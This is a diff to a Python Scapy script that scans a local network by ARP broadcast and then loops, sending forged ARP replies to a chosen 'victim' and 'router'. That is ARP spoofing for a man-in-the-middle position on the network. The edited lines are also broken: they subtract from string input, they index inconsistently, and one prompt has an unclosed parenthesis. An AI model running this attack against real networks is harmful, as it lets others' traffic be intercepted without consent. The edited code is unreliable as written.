@@ -10,7 +10,6 @@ target_ip = input()
 arp = ARP(pdst=target_ip)
 ether = Ether(dst="ff:ff:ff:ff:ff:ff")
 packet = ether/arp
-
 result = srp(packet, timeout=3, verbose=0)[0]
 
 ip = []
@@ -24,14 +23,15 @@ print("ips in the network", ip)
 print("macs in the network", mac)
 
 
-print("Enter victim ip")
+print("Enter victim ip (1, 2, 3,...)")
 victim = input()
-print("Enter router ip")
+print("Enter router ip (1, 2, 3, ...")
 router = input()
 
 while True:
-    arp_response = ARP(pdst=victim, hwdst=mac[ip.index(victim)], psrc=router)
+    arp_response = ARP(pdst=ip[victim-1], hwdst=mac[ip.index(victim)], psrc=ip[router-1])
     scap.send(arp_response, count = 1)
-    arp_response = ARP(pdst=router, hwdst=mac[ip.index(router)], psrc=victim)
+    arp_response = ARP(pdst=ip[router-1], hwdst=mac[ip.index(router)], psrc=ip[victim-1])
     scap.send(arp_response, count = 1)
     time.sleep(1)
+
